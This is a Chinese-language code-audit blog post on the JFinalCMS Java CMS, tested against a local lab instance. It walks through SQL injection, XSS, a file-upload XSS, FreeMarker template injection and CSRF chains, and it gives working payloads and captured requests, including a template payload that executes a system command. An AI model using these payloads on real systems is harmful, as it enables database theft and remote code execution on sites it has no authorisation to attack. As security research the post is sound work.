---
title: JFinalCMS
description: GitHub地址-https://github.com/jwillber/JFinalCMS
date: 2024-12-03
image: cover.png
categories:
    - cate2
tags:
    - Code Audit
---

## 项目技术栈

#### 软件架构

1. MVC:JFinal
2. 页面:enjoy
3. 缓存:ehcache
4. 数据库:Mysql

## 项目依赖审计

​	引入依赖无已披露漏洞

## 单点漏洞审计

### SQL

#### src\main\java\com\cms\entity\Content.java（成功）

```java
public Page<Content> findPage(Long categoryId,Boolean isEnabled,String title,Integer pageNumber,Integer pageSize){
	    String filterSql = "";
		if(categoryId!=null){
		    filterSql+=" and (categoryId="+categoryId+" or categoryId in ( select id from kf_category where treePath  like '%"+Category.TREE_PATH_SEPARATOR+categoryId+Category.TREE_PATH_SEPARATOR+"%'))";
		}
		if(isEnabled!=null){
		    filterSql+= " and isEnabled="+isEnabled;
		}
        if(StringUtils.isNotBlank(title)){
            filterSql+= " and title like '%"+title+"%'";
        }
		String orderBySql = DBUtils.getOrderBySql("createDate desc");
		return paginate(pageNumber, pageSize, "select *", "from kf_content where 1=1 "+filterSql+orderBySql);
	}
```

​	我们发现在title处使用了动态拼接，向上定位发现了有两个控制器直接调用了这个语句，分别在

src/main/java/com/cms/controller/front/CategoryController.java

src/main/java/com/cms/controller/admin/ContentController.java

​	这两个一个是在管理员后台的内容管理模块，一个是在前端的类型检索。后者危害显然更大，但是我们发现这里调用为静态调用，这里固定传参title为null。事实上，除去后端内容的控制器，其余所有的调用title都固定为null。

```java
setAttr("page", new Content().dao().findPage(categoryId, true,null,pageNumber,pageSize));
```

​	所以这里无法利用，那么我们就转到管理员后台的内容管理模块去测试。

![image-20241202104210107](/image-20241202104210107-1733226899924-1.png)

​	来到后台，根据title变量名，我们定位到标题查询的功能点，抓包。

```http
GET /admin/content/list?categoryId=1&title=test&pageSize=20&totalPage=1 HTTP/1.1
Host: 172.23.192.1:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.23.192.1:8888/admin/content/list?categoryId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: listQuery=%3FcategoryId%3D1; JSESSIONID=3C134A3BD7FF93C76A3E668F0946D633
Connection: close
```

​	其中GET参数中的title变量就是我们的注入点，我们输入单引号报错,使用sleep验证是否可执行函数，发现可执行函数，构造payload：

```sql
' and ascii(substr(database(),1,1))=1#
```

​	使用BP爆破，进行SQL盲注

![image-20241202144633949](/image-20241202144633949-1733226899925-2.png)

​	使用脚本处理数锯得到库名：

![image-20241202144839069](/image-20241202144839069-1733226899925-3.png)

#### src\main\java\com\cms\entity\ContentModel.java（成功）

```java
public Page<ContentModel> findPage(String name,Integer pageNumber,Integer pageSize){
	    String filterSql = "";
        if(StringUtils.isNotBlank(name)){
            filterSql+= " and name like '%"+name+"%'";
        }
	    String orderBySql = DBUtils.getOrderBySql("createDate desc");
		return paginate(pageNumber, pageSize, "select *", "from kf_content_model where 1=1 "+filterSql+orderBySql);
	}
```

​	向上追溯，发现被内容模型管理的list控制器直接调用，我们定位到前端的管理员内容管理模型管理，定位到查询功能点

![image-20241202145718689](/image-20241202145718689-1733226899925-4.png)

​	查询后抓包，抓得如下数据包：

```http
GET /admin/content_model/list?name=test&pageSize=20&totalPage=1 HTTP/1.1
Host: 172.23.192.1:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.23.192.1:8888/admin/content_model/list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=9D962EC77EDD63508C413E78024A69B1
Connection: close
```

​	其中GET传参中的name参数为注入点，输入单引号报错，输入注释符后正常，尝试sleep函数是否可执行判断是否可执行函数，发现可执行sleep函数，构造payload:

```sql
' and ascii(substr(database(),1,1))=1#
```

​	使用BP爆破

![image-20241202150219419](/image-20241202150219419-1733226899925-5.png)

​	处理数据后，得到库名：

![image-20241202150256796](/image-20241202150256796-1733226899925-6.png)

#### src\main\java\com\cms\entity\Ad.java（成功）

```java
public Page<Ad> findPage(String title,Integer pageNumber,Integer pageSize){
	    String filterSql = "";
	    if(StringUtils.isNotBlank(title)){
            filterSql+= " and title like '%"+title+"%'";
        }
		String orderBySql = DBUtils.getOrderBySql("createDate desc");
		return paginate(pageNumber, pageSize, "select *", "from kf_ad where 1=1 "+filterSql+orderBySql);
	}
```

​	向上追溯，发现改语句被广告模块的list方法调用了，我们定位到前端广告模块的查询功能

![image-20241202150756049](/image-20241202150756049-1733226899925-7.png)

​	查询后抓包的到如下数据包：

```http
GET /admin/ad/list?title=test&pageSize=20&totalPage=0 HTTP/1.1
Host: 172.23.192.1:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.23.192.1:8888/admin/ad/list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=9D962EC77EDD63508C413E78024A69B1
Connection: close
```

​	其中GET参数中的title就是注入点。

​	输入单引号报错，注释后恢复正常，测试sleep函数是否可用判断是否可执行函数，发现sleep可用，构造payload:

```sql
' and ascii(substr(database(),1,1))=1#
```

​	使用BP爆破：

![image-20241202151813365](/image-20241202151813365-1733226899925-9.png)

​	处理数据，得到库名：

![image-20241202151851427](/image-20241202151851427-1733226899925-8.png)

#### src\main\java\com\cms\entity\AdPosition.java（成功）

```java
public Page<AdPosition> findPage(String name,Integer pageNumber,Integer pageSize){
	    String filterSql = "";
        if(StringUtils.isNotBlank(name)){
            filterSql+= " and name like '%"+name+"%'";
        }
	    String orderBySql = DBUtils.getOrderBySql("createDate desc");
		return paginate(pageNumber, pageSize, "select *", "from kf_ad_position where 1=1 "+filterSql+orderBySql);
	}
```

​	向上追溯，定位到广告位的list控制器，前往前端的广告位控制器。

![image-20241202152458404](/image-20241202152458404-1733226899925-11.png)

​	抓包，得到如下数据包

```http
GET /admin/ad_position/list?name=test&pageSize=20&totalPage=1 HTTP/1.1
Host: 172.23.192.1:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.23.192.1:8888/admin/ad_position/list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=9D962EC77EDD63508C413E78024A69B1
Connection: close
```

​	其中GET参数中的name参数为注入点。

​	输入单引号报错，输入注释符变为正常，测试sleep函数判断是否可执行函数，发现函数可执行，构造payload:

```sql
' and ascii(substr(database(),1,1))=1#
```

​	使用BP爆破：

![image-20241202152737693](/image-20241202152737693-1733226899925-12.png)

​	处理数据，得到库名：

![image-20241202152802353](/image-20241202152802353-1733226899925-10.png)

#### src\main\java\com\cms\entity\Tag.java（成功）

```java
public Page<Tag> findPage(String name,Integer pageNumber,Integer pageSize){
        String filterSql = "";
        if(StringUtils.isNotBlank(name)){
            filterSql+= " and name like '%"+name+"%'";
        }
        String orderBySql = DBUtils.getOrderBySql("createDate desc");
        return paginate(pageNumber, pageSize, "select *", "from kf_tag where 1=1 "+filterSql+orderBySql);
    }
```

​	向上追溯，根据路由定位到前端的标签管理的查询功能

​	![image-20241203122034629](/image-20241203122034629.png)

​	查询，抓包，抓得如下数据包：

```http
GET /admin/tag/list?name=test&pageSize=20&totalPage=0 HTTP/1.1
Host: 172.21.127.205:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.21.127.205:8888/admin/tag/list
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=2DE50A32542B4705A70D6CC4FDD343BC
Connection: close
```

​	其中的name为注入点，输入单引号报错，注释后恢复正常。测试sleep 函数判断是否可执行函数，成功执行函数，构造payload:

```sql
' and ascii(substr(database(),1,1))=1#
```

![image-20241203122501296](/image-20241203122501296.png)

​	得到库名：

![image-20241203122634716](/image-20241203122634716.png)

​	该项目几乎所有的查询功能使用的都是动态拼接，payload也都是相同的payload，因此不再详细写出，仅列出部分文件的位置。

src\main\java\com\cms\entity\AdPosition.java

src\main\java\com\cms\entity\Role.java

src\main\java\com\cms\entity\FriendLink.java

### 任意文件控制（上传、读取等）

​	我们搜索upload，定位到文件上传的控制器

#### src\main\java\com\cms\controller\admin\FileController.java

```java
public void upload() {
		UploadFile uploadFile = getFile();
		String fileType = getPara("fileType");
		Map<String, Object> data = new HashMap<String, Object>();
		if (fileType == null || uploadFile == null || uploadFile.getFile().length()==0) {
			data.put("message", "操作错误");
			data.put("state", "ERROR");
			renderJson(data);
			return;
		}
		String url = StorageUtils.upload(fileType, uploadFile, false);
		if (StringUtils.isEmpty(url)) {
			data.put("message", "上传文件出现错误");
			data.put("state", "ERROR");
			renderJson(data);
			return;
		}
		data.put("message", "成功");
		data.put("state", "SUCCESS");
		data.put("url", url);
		uploadFile.getFile().delete();
		renderJson(data);
	}
```

​	经过审计和测试，我发现该区域可以上传html文件，实现XSS。

​	我们上传一个写入了XSSpayload的图片文件，上传后抓包，修改后缀为html即可实现XSS攻击。

![image-20241203130553075](/image-20241203130553075.png)

​	访问返回的URL

![image-20241203130625910](/image-20241203130625910.png)

### 模板注入

#### src\main\java\com\cms\controller\admin\TemplateController.java

```java
public void update() {
		String fileName = getPara("fileName");
		String directory = getPara("directory");
		String content = getPara("content");
		if (StringUtils.isBlank(fileName) || content == null) {
			render(CommonAttribute.ADMIN_ERROR_VIEW);
			return;
		}
		TemplateUtils.write(SystemUtils.getConfig().getTheme()+"/"+directory.replaceAll(",", "/")+"/"+fileName, content);
		FreeMarkerRender.getConfiguration().clearTemplateCache();
		redirect(getListQuery("/admin/template/list"));
	}
```

​	我们定位到前端的模板编辑功能

![image-20241203184741148](/image-20241203184741148.png)

​	审计代码我们可知，模板修改的过程中没有进行过滤，因此我们可以直接嵌入payload：

```html
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")} 
```

​	我们选择about.html这个模板文件，然后写入payload。

![image-20241203184912279](/image-20241203184912279.png)

​	保存，然后访问about页面。

![image-20241203184949248](/image-20241203184949248.png)

## 前端渗透测试

### XSS

​	经过审计我发现，该项目没有似乎又没任何地方有对XSS进行拦截或过滤，所以该项目多处存在XSS。这里篇幅所限，我只拿出其中一个反射型XSS来演示。

​	我们来到标签模块的控制器这里

#### src/main/java/com/cms/controller/admin/TagController.java

```java
public void list() {
        String name = getPara("name");
        Integer pageNumber = getParaToInt("pageNumber");
        if(pageNumber==null){
            pageNumber = 1;
        }
        setAttr("page", new Tag().dao().findPage(name,pageNumber,PAGE_SIZE));
        setAttr("name", name);
        render(getView("tag/list"));
    }
```

​	可以看到这里直接就把name放模板里边了，没有进行任何过滤，接下来我们回到前端的标签模块，进行查询，后抓包，得到如下路由：

```http
/admin/content/list?categoryId=1&title=&pageSize=20&totalPage=1
```

​	其中的title就是XSS注入点，我们构造一下payload:

```html
"><img src=x onerror=alert(1)>//
```

​	放到title参数中，访问后即可触发XSS。

![image-20241203192550271](/image-20241203192550271.png)

​	当然注入点很多，也存在很多POST的存储型注入，但是利用难度较大，不过这个项目还存在CSRF因此，还可尝试CSRF+XSS的组合拳。

### CSRF

​	我们先构造数据包，我们创建一个标签，抓包。

```http
POST /admin/tag/save HTTP/1.1
Host: 192.168.113.43:8888
Content-Length: 9
Cache-Control: max-age=0
Origin: http://192.168.113.43:8888
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.113.43:8888/admin/tag/add
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=807D599B9C63E998E02431A4EEDB2C7C
Connection: close

name=CSRF
```

​	构造CSRF的POC，模拟管理员受到CSRF攻击。

![image-20241203193127386](/image-20241203193127386.png)

​	可以看到成功新增了标签，但是CSRF能做的远不止于此。

### CSRF+XSS

​	经过审计我们知道，这个项目没有过滤和拦截XSS，所以我们构造一个名称为XSSpayload的标签，payload如下：

```html
<img src=x onerror=alert('CSRF+xss')>
```

​	抓包。

```http
POST /admin/form_model/save HTTP/1.1
Host: 192.168.113.43:8888
Content-Length: 60
Cache-Control: max-age=0
Origin: http://192.168.113.43:8888
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.113.43:8888/admin/form_model/add
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=A3628DAC00BED9F645E9E30C003F27B1
Connection: close

name=%3Cimg+src%3Dx+onerror%3Dalert%28%27CSRF%2Bxss%27%29%3E
```

​	构造CSRF的POC。访问后成功创建了嵌入XSSpayload的表单模型，并触发了XSS攻击。

![image-20241203193643705](/image-20241203193643705.png)

### CSRF+SSTI（模板注入漏洞）

​	我们前面的测试已经验证了存在SSTI，但是这需要极高的管理员权限，所以利用难度较大，可如果我们将CSRF和模板注入漏洞进行组合，那么我们的利用难度就会大大降低。

​	我们先构造含有SSTI攻击的POC，先在模板修改这里修改一下模板，嵌入攻击语句，抓包。

```http
POST /admin/template/update HTTP/1.1
Host: 192.168.113.43:8888
Content-Length: 897
Cache-Control: max-age=0
Origin: http://192.168.113.43:8888
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.113.43:8888/admin/template/edit?fileName=banner.html&directory=,front
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: listQuery=%3FfileName%3Dbanner.html%26directory%3D%2Cfront; JSESSIONID=A3628DAC00BED9F645E9E30C003F27B1
Connection: close

fileName=banner.html&directory=%2Cfront&content=%3C%23assign+value%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7Bvalue%28%22calc.exe%22%29%7D+%0D%0A+%3Cdiv+class%3D%22caselist-banner%22%3E%0D%0A+%09%3Cdiv+class%3D%22overlay%22%3E%0D%0A+%09%3Cdiv+class%3D%22hero-section+am-text-center%22%3E%0D%0A+%09%09%3Ch1%3E%E6%8C%81%E7%BB%AD%E4%B8%BA%E5%AE%A2%E6%88%B7%E5%88%9B%E9%80%A0%E4%BB%B7%E5%80%BC%3C%2Fh1%3E%0D%0A+%09%09%3Cp%3E5%E5%B9%B4%E6%9D%A5%E6%88%91%E4%BB%AC%E7%A7%AF%E7%B4%AF%E4%BA%86%E5%A4%A7%E9%87%8F%E7%9A%84%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B%EF%BC%8C%E5%B9%B6%E5%9C%A8%E4%B8%8D%E6%96%AD%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B8%AD%E6%80%BB%E7%BB%93%E7%BB%8F%E9%AA%8C%EF%BC%8C%E5%B8%AE%E6%82%A8%E6%8C%96%E6%8E%98%E5%92%8C%E5%88%9B%E6%96%B0%E6%9B%B4%E5%A4%A7%E5%95%86%E6%9C%BA%E7%9A%84%E5%8F%AF%E8%83%BD%3C%2Fp%3E%0D%0A++++++%3C%2Fdiv%3E%0D%0A++++++%3C%2Fdiv%3E%0D%0A+%3C%2Fdiv%3E
```

​	构造CSRF的POC，drop掉数据包，模拟管理员受到攻击，访问POC。然后访问关于页面。

![image-20241203194517774](/image-20241203194517774.png)

​	成功执行命令。

### 越权漏洞

​	创建一个低权限用户组和一个低权限用户。

![image-20241203194843474](/image-20241203194843474.png)

​	![image-20241203194853014](/image-20241203194853014.png)

​	登录test用户获取cookie，但是经过我的审计和测试，这个项目似乎并没有做出权限校验的功能？所以越权漏洞就不不在这里写出，如果有兴趣的师傅可以自行下载项目进行测试。

​	至此，审计结束。
